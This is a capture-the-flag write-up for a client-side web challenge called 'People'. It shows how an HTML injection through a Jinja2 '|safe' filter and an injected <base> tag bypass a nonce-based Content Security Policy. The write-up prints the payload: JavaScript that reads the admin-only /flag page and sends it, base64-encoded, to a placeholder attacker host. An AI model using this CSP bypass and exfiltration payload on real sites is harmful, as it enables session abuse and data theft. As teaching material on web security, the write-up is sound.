@@ -1,0 +1,124 @@
+<hr />
+
+<h2>description: Base element CSP bypass</h2>
+
+<h1>People</h1>
+
+<h2>Description</h2>
+
+<blockquote>
+  <p>With the new People personal pages, all the members of the EPFL community can have their own page personalize it with Markdown and much more...</p>
+</blockquote>
+
+<p>{% file src="../../.gitbook/assets/people.zip" %}</p>
+
+<h2>Solution</h2>
+
+<p>This was a client-side web challenge where we had to cause an XSS in a user's profile to obtain the flag through the admin account.</p>
+
+<p>```python
+@main.route('/flag')
+def flag():
+    if request.cookies.get('admin<em>token') == admin</em>token:
+        return os.getenv('FLAG') or 'flag{flag<em>not</em>set}'
+    else:
+        abort(403)</p>
+
+<p>@main.route('/report/<user_id>', methods=['POST'])
+@limiter.limit("2/2 minute")
+def report(user<em>id):
+    user = User.query.get(user</em>id)
+    q.enqueue(visit, user.id, admin<em>token)
+    flash("Thank you, an admin will review your report shortly.", "success")
+    return redirect(url</em>for('main.profile', user<em>id=user</em>id))
+```</p>
+
+<p>Let's take a look at our potential injection points. One of the suspicious features of the profile page was that we were able to edit our bio in Markdown.</p>
+
+<figure><img src="../../.gitbook/assets/Screenshot 2022-09-26 at 9.02.39 PM.png" alt=""><figcaption></figcaption></figure>
+
+<p>This is then parsed using <code>marked</code> and <code>DOMPurify</code>.</p>
+
+<p>```markup</p>
+
+<section>
+
+      ...
+
+        <div class="block about">
+          <h3>About</h3>
+          <div class="markdown">{{ user['bio'] }}</div>
+        </div>
+
+      ...
+
+</section>
+
+<p>...</p>
+
+<script src="/static/js/marked.min.js" nonce="{{ csp_nonce() }}"></script>
+
+<script src="/static/js/purify.min.js" nonce="{{ csp_nonce() }}"></script>
+
+<script nonce="{{ csp_nonce() }}">
+  var markdown = document.querySelectorAll(".markdown");
+  for (var i = 0; i < markdown.length; i++) {
+    var html = marked.parse(markdown[i].innerHTML, {
+      breaks: true
+    });
+    html = DOMPurify.sanitize(html, { USE_PROFILES: { html: true } });
+    markdown[i].innerHTML = html;
+  }
+</script>
+
+<p>```</p>
+
+<p>We could find out the version numbers of these libraries through the <code>marked.min.js</code> and <code>purify.min.js</code> files. Doing a search on these versions yielded no security vulnerabilities.</p>
+
+<p>While <a href="https://infosecwriteups.com/clique-writeup-%C3%A5ngstromctf-2022-e7ae871eaa0e">mutation XSS</a> attacks might still be possible on these libraries, those attacks would likely only happen when <code>DOMPurify</code> is used <em>before</em> <code>marked</code>, because <code>marked</code> deliberately <a href="https://marked.js.org/">does not sanitize output HTML</a>. It was also unlikely that this involved a zero-day in <code>DOMPurify</code>, so let's look around a little more.</p>
+
+<p>In Jinja2, the <code>|safe</code> <a href="https://jinja.palletsprojects.com/en/3.1.x/templates/#filters">filter</a> renders unescaped HTML. Doing a grep search for the <code>safe</code> filter finds this interesting part of the <code>profile.html</code> template.</p>
+
+<p><code>django
+{% raw %}
+{% set description = '%s at %s' % (user['title'], user['lab']) %}
+{% block title %}{{user['fullname']}} | {{description|safe}}{% endblock %}
+{% endraw %}
+</code></p>
+
+<p>Nice, we have our HTML injection vector! Trying to insert a <code>&lt;script&gt;</code> payload wouldn't work though, since the Content Security Policy doesn't allow us to load arbitrary scripts without a randomly-generated<code>nonce</code>.</p>
+
+<p><code>python
+csp = {
+    'script-src': '',
+    'object-src': "'none'",
+    'style-src': "'self'",
+    'default-src': ['*', 'data:']
+}
+Talisman(app,
+    force_https=False,
+    strict_transport_security=False,
+    session_cookie_secure=False,
+    content_security_policy=csp,
+    content_security_policy_nonce_in=['script-src'])
+</code></p>
+
+<p>When this happens, we can rely on the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base"><code>&lt;base&gt;</code> HTML tag</a> to set the base URL to use for all relative URLs in a document.</p>
+
+<p>This means that we could load the <code>/static/js/marked.min.js</code> files from a completely different URL that we control. Since these script tags are part of the original template and the <code>nonce</code> is always appropriately set, the browser would have no issues executing the script from our URL.</p>
+
+<p>```markup</p>
+
+<script src="/static/js/marked.min.js" nonce="{{ csp_nonce() }}"></script>
+
+<p>```</p>
+
+<p>We start a HTTP server and create the <code>/static/js</code> directory structure, and place our XSS payload in <code>marked.min.js</code>.</p>
+
+<p><code>javascript
+fetch(`http://${window.location.host}/flag`).then(res =&gt; res.text()).then(data =&gt; {
+    fetch("http://HOST:PORT?flag=" + btoa(data));
+})
+</code></p>
+
+<p>Then we could inject <code>&lt;base href="http://HOST:PORT"&gt;</code> into our profile through <code>user['title']</code> or <code>user['lab']</code>.</p>
